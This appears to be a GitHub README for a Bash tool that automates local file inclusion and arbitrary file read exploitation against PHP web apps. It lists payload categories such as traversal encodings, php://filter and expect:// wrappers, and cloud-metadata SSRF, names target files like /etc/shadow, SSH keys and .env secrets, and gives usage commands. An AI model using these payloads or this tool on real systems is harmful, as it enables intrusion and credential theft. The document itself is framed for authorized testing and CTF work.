# READFILE PWNER v2.0 — "GHOST PROTOCOL"

**Made by Taylor Christian Newsome**

![Bash](https://img.shields.io/badge/language-Bash-4EAA25?logo=gnubash&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20WSL-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue)
![Use](https://img.shields.io/badge/use-CTF%20%7C%20Bug%20Bounty%20%7C%20Pentest-red)

> **One Bash script. 187 payloads. Parallel workers. Zero false positives.**
>
> An automated LFI / arbitrary-file-read exploitation tool that hunts down vulnerable `readfile()` (and equivalent) endpoints in PHP web apps — then exfiltrates `/etc/passwd`, SSH keys, AWS credentials, `.env` files, config secrets, and CTF flags in a single command.

---

## 📖 Table of Contents

- [What It Does](#-what-it-does)
- [Why It Exists](#-why-it-exists)
- [Features](#-features)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [How It Works](#-how-it-works)
- [The Zero-False-Positive Engine](#-the-zero-false-positive-engine)
- [Payload Coverage](#-payload-coverage)
- [Output & Loot](#-output--loot)
- [Examples](#-examples)
- [Performance](#-performance)
- [Comparison](#-comparison)
- [FAQ](#-faq)
- [Legal / Disclaimer](#-legal--disclaimer)
- [Author](#-author)
- [License](#-license)

---

## 🎯 What It Does

**readfile_pwn** is a single-file Bash exploitation tool for **Local File Inclusion (LFI)** and **arbitrary file read** vulnerabilities in PHP applications.

It targets the classic bug pattern:

```php
readfile($_GET['file']);   // ← unfiltered user input
```

…and automatically:

1. **Discovers** which parameter is vulnerable (`file`, `page`, `path`, `download`, etc.)
2. **Fires 187 payloads in parallel** across traversal, wrappers, logs, procfs, cloud metadata, and CTF-specific paths
3. **Confirms every hit** through a triple-gate filter (regex + entropy + differential re-fetch) to eliminate false positives
4. **Dumps loot** into a timestamped directory with raw files, a human log, and a machine-readable JSONL feed

No Python. No Metasploit. No Burp. Just `bash`, `curl`, and attitude.

---

## 💡 Why It Exists

`readfile()` looks innocent in the PHP docs:

> *"Reads a file and writes it to the output buffer."*

But it honors **`fopen` wrappers** — meaning a single unfiltered call gives an attacker:

- Arbitrary **file read** (`/etc/passwd`, `/etc/shadow`, SSH keys, `/root/.bash_history`)
- **PHP source disclosure** via `php://filter/convert.base64-encode` — even for files the server normally executes
- **Potential RCE** via `data://`, `expect://`, `phar://`, `zip://`, log poisoning, `/proc/self/environ`, or session-file inclusion
- **SSRF** into cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`)

Existing LFI tools (`LFISuite`, `liffy`, `kadimus`) require Python 2/3, pip, and a working virtualenv. That's fine on your laptop — **useless on a stripped CTF box or a restricted engagement shell**.

**readfile_pwn runs on bare Linux with nothing but `curl` and `base64`.** That's the entire dependency list.

---

## ✨ Features

- 🚀 **Parallel scanning** via `xargs -P` — 187 vectors in ~15 seconds
- 🎯 **Triple-gate zero-FP engine** — regex + base64 entropy + differential re-fetch
- 🗂️ **187 curated payloads** across 11 categories
- 🧠 **Auto parameter discovery** — probes 30+ common param names via GET
- 🍪 **Cookie & POST support** — authenticated and non-GET targets
- 📁 **Loot directory** — every hit saved raw + decoded, timestamped
- 🧾 **JSONL output** — pipe into `jq`, Splunk, ELK, whatever
- 🏁 **Auto-flag detection** — `flag{}`, `HTB{}`, `picoCTF{}`, `DUCTF{}`, `THM{}`, `CTF{}`
- 🔑 **Auto-secret detection** — AWS keys (`AKIA...`), private keys (`BEGIN RSA PRIVATE KEY`), `DB_PASSWORD`, `JWT_SECRET`, `API_KEY`
- 🛡️ **Reflected-page killer** — re-fetches every candidate against a random control payload
- 🎨 **Hak5-grade terminal output** — because if you're not having fun, why bother
- 📦 **Zero install footprint** — clone, `chmod +x`, run

---

## 📋 Requirements

| Requirement | Notes |
|---|---|
| **Bash 4.0+** | Uses `<<<`, arrays, `export -f` |
| **curl** | Any version from the last decade |
| **base64** | GNU coreutils |
| **grep, sed, awk, tr, wc, head, date, mkdir, sort** | Standard on Linux/macOS/WSL |

**Tested on:**
- Kali Linux 2024.x
- Ubuntu 20.04 / 22.04 / 24.04
- Debian 11 / 12
- macOS 13+ (Homebrew `curl`)
- WSL2 (Ubuntu)

**Not** compatible with Windows CMD/PowerShell natively — use WSL.

---

## 🚀 Installation

```bash
git clone https://github.com/<your-user>/readfile_pwn.git
cd readfile_pwn
chmod +x readfile_pwn.sh

# Optional: symlink into PATH
sudo ln -sf "$PWD/readfile_pwn.sh" /usr/local/bin/readfile_pwn
```

That's it. No `pip install`. No `composer`. No `npm`.

---

## 🎮 Usage

### Basic syntax

```bash
./readfile_pwn.sh <url|host/path> [port] [param] [threads]
```

### Accepted target formats

```bash
./readfile_pwn.sh http://target.com/read.php
./readfile_pwn.sh https://target.com/download.php
./readfile_pwn.sh target.com/read.php
./readfile_pwn.sh 192.168.1.10 8080
./readfile_pwn.sh 10.10.10.5 80 file
./readfile_pwn.sh host:8080/path.php
```

### Environment variables

| Var | Default | Purpose |
|---|---|---|
| `COOKIE` | *(empty)* | Session cookie — `PHPSESSID=abc123` |
| `METHOD` | `GET` | `GET` or `POST` |
| `MODE` | `scan` | Reserved for `deep` / `poison` follow-ups |

### Examples

```bash
# Auto-discover param, 20 threads
./readfile_pwn.sh target.com/read.php

# Explicit param, 50 threads (CTF LAN speedrun)
./readfile_pwn.sh 10.10.10.5 80 file 50

# Authenticated scan
COOKIE='PHPSESSID=abc123' ./readfile_pwn.sh target.com/read.php 80 file

# POST-based vuln
METHOD=POST COOKIE='...' ./readfile_pwn.sh target.com/read.php 80 file
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | One or more confirmed hits |
| `1` | No hits — try another param or add cookies |
| `2` | Could not auto-detect parameter |

---

## 🔬 How It Works

```
┌──────────────────────────────────────────────────────────────────┐
│  1. INPUT NORMALIZATION                                          │
│     Accepts URL, host/path, bare IP+port, or host:port/path      │
├──────────────────────────────────────────────────────────────────┤
│  2. PARAMETER DISCOVERY                                          │
│     Probes 30+ candidate names (file, page, path, download, ...) │
│     via GET; first non-000/non-404 wins                          │
├──────────────────────────────────────────────────────────────────┤
│  3. PAYLOAD STORM (187 vectors, xargs -P N)                      │
│     Workers dispatched in parallel — LAN sweep in ~15s           │
├──────────────────────────────────────────────────────────────────┤
│  4. TRIPLE-GATE CONFIRMATION                                     │
│     Gate 1: high-confidence regex signature                      │
│     Gate 2: base64 entropy (>85% charset, len > 40)              │
│     Gate 3: differential re-fetch vs random control              │
├──────────────────────────────────────────────────────────────────┤
│  5. LOOT EXFILTRATION                                            │
│     loot_<ts>/  +  scan.txt  +  scan.jsonl  +  raw files         │
└──────────────────────────────────────────────────────────────────┘
```

### The parallel engine

Workers are spawned with `xargs -P <threads>` and a `bash -c` wrapper that calls an exported `fetch_one` function. This avoids GNU `parallel`, Python, or manual `&`/`wait` juggling — pure portable Bash.

```bash
< "$TMP_JOBS" xargs -P "$THREADS" -n 2 -d '\n' bash -c '
  line="$1"; idx="${line%%	*}"; payload="${line#*	}"
  fetch_one "$payload" "$idx" "'"$TOTAL"'"
' _
```

---

## 🛡️ The Zero-False-Positive Engine

This is what separates a toy from a tool. **Every reported hit passes three independent gates.**

### Gate 1 — Signature regex

The response body must match one of ~25 high-confidence patterns:

| Pattern | Detects |
|---|---|
| `^root:[^:]*:0:0:` | Real `/etc/passwd` |
| `^daemon:[^:]*:1:1:` | Real `/etc/passwd` |
| `\[(fonts\|extensions\|mci extensions)\]` | Real `win.ini` |
| `^Linux version ` | Real `/proc/version` |
| `^(HTTP_USER_AGENT\|HTTP_ACCEPT\|PATH\|DOCUMENT_ROOT)=` | Real `/proc/self/environ` |
| `DISTRIB_ID=` | Real `/etc/os-release` |
| `^SSH-2\.0` | Real SSH banner |
| `BEGIN (RSA\|OPENSSH\|DSA\|EC\|PGP) PRIVATE KEY` | **Private key leak** |
| `AKIA[0-9A-Z]{16}` | **AWS access key** |
| `DB_PASSWORD\|API_KEY\|JWT_SECRET\|SECRET_KEY` | **Secrets leak** |
| `flag\{...\}\|HTB\{...\}\|picoCTF\{...\}\|DUCTF\{...\}\|THM\{...\}` | **CTF flag** |

### Gate 2 — Base64 entropy gate

Before attempting `base64 -d` on any response:

- Body length must be **> 40 bytes** (kills `==` padding noise)
- At least **85% of bytes** must be in `[A-Za-z0-9+/=]`
- Length mod 4 must be fixable (2 or 3 — **never 1**)
- Decoded output must contain `<?php`, `function `, `DB_`, `AKIA`, `flag{`, etc.

Fails any check → **no decode, no report.** Kills the classic FP where a random page happens to end in `=`.

### Gate 3 — Differential re-fetch

Every candidate hit is **re-fetched** with a randomized garbage payload:

```bash
curl "$URL?file=__control_1696123456789123456__"
```

If the response is **byte-identical** to the candidate → it's a reflected page, not a real file read → **discarded**.

**Net effect:** if you see a 💀 HIT, it's real.

---

## 📦 Payload Coverage

**187 vectors across 11 categories:**

| Category | Count | Highlights |
|---|---|---|
| Linux path traversal | ~20 | `../`, `....//`, `%2f`, `%252f`, overlong UTF-8 (`%c0%af`, `%c1%9c`), null-byte |
| Sensitive Linux files | ~40 | `/etc/shadow`, `/etc/sudoers`, `/root/.ssh/id_rsa`, `/root/.bash_history`, Apache/Nginx confs |
| Application files | ~10 | `wp-config.php`, `.env`, `composer.json`, `database.php`, `settings.php` |
| Logs | ~10 | Apache/Nginx access+error logs |
| procfs | ~18 | `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/fd/*`, `/proc/net/tcp`, `/proc/1/cmdline` |
| Windows | ~12 | `win.ini`, `boot.ini`, `SAM`, `web.config`, backslash + `%5c` variants |
| PHP wrappers (read) | ~20 | `php://filter/convert.base64-encode/resource=...` |
| PHP wrappers (chains) | ~6 | Double base64, `zlib.deflate`, `iconv.utf-8.utf-16`, nested `php://filter` |
| PHP wrappers (RCE/info) | ~15 | `data://`, `expect://`, `php://fd/1`, `php://input`, `phar://`, `zip://`, `glob://` |
| Cloud metadata (SSRF) | ~8 | AWS `169.254.169.254`, GCP `metadata.google.internal`, Alibaba `100.100.100.200` |
| Cache/temp/dev | ~8 | `/tmp/sess_*`, `/dev/null`, `/dev/urandom` |

Full list is in the `PAYLOADS=( ... )` array inside `readfile_pwn.sh`.

---

## 🗂️ Output & Loot

Every run creates a timestamped loot directory:

```
loot_20260930_143022/
├── scan.txt                           # full human-readable log
├── scan.jsonl                         # machine-readable, one JSON per hit
├── linux_passwd_etc_passwd.txt        # raw exfil per hit
├── php_b64_config.php.txt             # decoded source
├── FLAG_flag.php.txt                  # captured flag
└── aws_creds_.env.txt                 # leaked AWS creds
```

### JSONL format

```json
{"idx":12,"payload":"/etc/passwd","sig":"linux_passwd","code":"200","len":1874}
{"idx":55,"payload":"php://filter/convert.base64-encode/resource=config.php","sig":"php_b64","code":"200","len":2841}
{"idx":103,"payload":".env","sig":"aws_creds","code":"200","len":512}
```

### Pipe it

```bash
# Show only flags
jq -r 'select(.sig=="FLAG") | .payload' loot_*/scan.jsonl

# Show only AWS creds
jq -r 'select(.sig=="aws_creds" or .sig=="aws_key") | .payload' loot_*/scan.jsonl

# Count hits by type
jq -r '.sig' loot_*/scan.jsonl | sort | uniq -c | sort -rn
```

---

## 🎬 Examples

### Example 1 — CTF box, auto-discover, fast

```bash
$ ./readfile_pwn.sh 10.10.10.5 80
[*] no param specified — sniffing GET+POST...
    ✔ param → file  (HTTP 200)
[*] param    : file
[*] payloads : 187
[*] launching 20 workers...

  ╔══════════════════════════════════════════════════════════╗
  ║  💀 HIT  12/187  linux_passwd   HTTP 200                  ║
  ╚══════════════════════════════════════════════════════════╝
  ▶ payload: /etc/passwd
      root:x:0:0:root:/root:/bin/bash
      ...

  ╔══════════════════════════════════════════════════════════╗
  ║  💀 HIT  103/187  FLAG   HTTP 200                         ║
  ╚══════════════════════════════════════════════════════════╝
  ▶ payload: php://filter/convert.base64-encode/resource=flag.php
      <?php
      $flag = "HTB{r34df1l3_pwn3d}";
      ?>
```

### Example 2 — Authenticated bug bounty target

```bash
COOKIE='PHPSESSID=9a8b7c6d5e4f' ./readfile_pwn.sh https://app.example.com/download 443 file 30
```

### Example 3 — POST-based endpoint

```bash
METHOD=POST COOKIE='session=xyz' ./readfile_pwn.sh target.com/api/export 443 template
```

---

## ⚡ Performance

| Workload | Sequential | v2.0 (20 threads) | v2.0 (50 threads) |
|---|---|---|---|
| 187 vectors, LAN | ~5 min | **~15 sec** | ~8 sec |
| 187 vectors, WAN | ~15 min | **~25 sec** | ~20 sec |

Parallelism is done with portable `xargs -P` + `export -f` — **no GNU `parallel`, no Python, no background-job juggling.**

---

## 🥊 Comparison

| Feature | LFISuite | liffy | kadimus | **readfile_pwn** |
|---|---|---|---|---|
| Language | Python 2 | Python 3 | C | **Pure Bash** |
| Runs on bare box | Needs pip | Needs pip | Needs make | ✅ **curl+base64 only** |
| Parallel scan | ❌ | ❌ | ❌ | ✅ **xargs -P** |
| Triple-gate FP filter | Partial | ❌ | ❌ | ✅ |
| Auto loot directory | ❌ | ❌ | ❌ | ✅ |
| JSONL output | ❌ | ❌ | ❌ | ✅ |
| Wrapper chains | Limited | Limited | ❌ | ✅ **20+** |
| Cloud metadata SSRF | ❌ | ❌ | ❌ | ✅ |
| AWS key / private key regex | ❌ | ❌ | ❌ | ✅ |
| CTF flag regex | ❌ | ❌ | ❌ | ✅ |
| Cookie / POST support | ✅ | ✅ | ✅ | ✅ |

---

## ❓ FAQ

<details>
<summary><b>Is this just a wrapper around curl?</b></summary>

It's a wrapper around curl *the way Metasploit is a wrapper around sockets.* The value is in the 187 curated payloads, the triple-gate FP engine, the auto param discovery, the parallel engine, and the loot pipeline. Anyone can `curl` a file. Doing it reliably, fast, across 187 vectors, with zero FPs, and dumping structured loot is the tool.
</details>

<details>
<summary><b>Why Bash and not Python?</b></summary>

Because the moment you land on a CTF box or a restricted engagement shell, Python may not be installed, pip may be blocked, and `venv` may not exist. Bash + curl + base64 is *always* there. That's the design constraint.
</details>

<details>
<summary><b>Will it find RCE?</b></summary>

It finds the *primitives* that lead to RCE — `php://filter` source leaks, `/proc/self/environ`, writable log paths, session file paths, `data://`, `expect://`, `phar://`. Actual escalation (log poisoning, session poisoning) is left to the operator because it's target-specific. The tool prints suggested next-moves at the end of a successful run.
</details>

<details>
<summary><b>Does it work on Windows targets?</b></summary>

Yes — 12 dedicated Windows payloads (`win.ini`, `boot.ini`, `SAM`, `web.config`, plus backslash and `%5c`/`%255c` encodings). The tool itself runs on Linux/macOS/WSL.
</details>

<details>
<summary><b>Why "GHOST PROTOCOL"?</b></summary>

Because "v2.0" is boring and every good security tool needs a codename. It's the version that added the differential FP filter and parallel engine — the two things that turn it from a script into a tool.
</details>

<details>
<summary><b>Can I add my own payloads?</b></summary>

Yes. Open `readfile_pwn.sh`, find the `PAYLOADS=( ... )` array, add your vector on its own line, save. No recompile, no config file, no YAML. That's the entire extension API.
</details>

---

## ⚖️ Legal / Disclaimer

> **This tool is for authorized security testing only.**

**Permitted use:**
- Systems **you own**
- **CTF** platforms (HTB, THM, VulnHub, picoCTF, etc.)
- **Bug bounty** targets that are **explicitly in scope** and whose program rules you follow
- **Authorized penetration tests** with a signed scope document

**Prohibited use:**
- Any system you do not have **written authorization** to test
- Exfiltrating real user data (PII, PHI, PCI) — reading `/etc/passwd` as a canary to prove impact is fine; downloading customer records is a federal crime
- Anything that violates CFAA (US), Computer Misuse Act (UK), or your local equivalent

**The author assumes no liability for misuse. You are solely responsible for your actions.**

---

## 👤 Author

**Taylor Christian Newsome**

- Built for the DEF CON / CTF / bug bounty community
- Inspired by the Hak5 philosophy: *trust your technolust*
- If this tool helped you land a flag or a bounty, buy me a coffee (or a Hak5 Pineapple)

> *"Read the docs. Then read the files."*

---

## 📜 License

MIT License — see [LICENSE](LICENSE) for full text.

```
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
```

---

## ⭐ Contributing

PRs welcome. High-value additions:

- New payload categories (container escapes, Kubernetes service accounts)
- WAF bypass encoding variants
- Additional signature regexes
- Deep-mode follow-ups (auto log poisoning, auto session poisoning)

Please keep additions **Bash-only, dependency-free, and FP-safe.**

If this tool saved you time on a box, **star the repo** — it helps other hunters find it.

---

```
        ▓▓▓  trust your technolust  ▓▓▓
        ▓▓▓  made by Taylor Christian Newsome  ▓▓▓
```
